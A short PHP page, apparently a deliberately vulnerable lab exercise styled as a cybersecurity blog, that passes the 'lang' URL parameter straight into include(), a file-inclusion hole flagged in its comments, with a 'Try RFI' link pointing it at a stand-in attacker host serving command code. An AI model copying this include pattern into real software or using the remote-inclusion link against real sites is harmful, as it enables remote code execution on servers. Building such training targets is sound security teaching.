<?php
// vulnerable index.php for a "multilingual" site

$lang = $_GET['lang'] ?? 'en.php';  // default lang

// Output basic HTML structure + CSS
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Big Brooklyn's Cyber Blog</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #0e0e0e;
      color: #e0e0e0;
      margin: 0;
      padding: 20px;
    }
    header {
      background-color: #1f1f1f;
      padding: 20px;
      border-bottom: 2px solid #333;
    }
    header h1 {
      margin: 0;
      color: #00ffe1;
    }
    nav {
      margin-top: 10px;
    }
    nav a {
      color: #00ffe1;
      text-decoration: none;
      margin-right: 15px;
      font-weight: bold;
    }
    main {
      margin-top: 20px;
    }
    footer {
      margin-top: 40px;
      border-top: 1px solid #333;
      padding-top: 10px;
      font-size: 0.9em;
      color: #888;
    }
  </style>
</head>
<body>
  <header>
    <h1>Big Brooklyn's Cybersecurity Blog</h1>
    <nav>
      <a href="?lang=en.php">English</a>
      <a href="?lang=fr.php">Français</a>
      <a href="?lang=http://attacker.thm/cmd.txt">Try RFI 😈</a>
    </nav>
  </header>
  <main>
    <?php
      // ⚠️ Real vuln: no validation or sanitization
      include($lang);
    ?>
  </main>
</body>
</html>
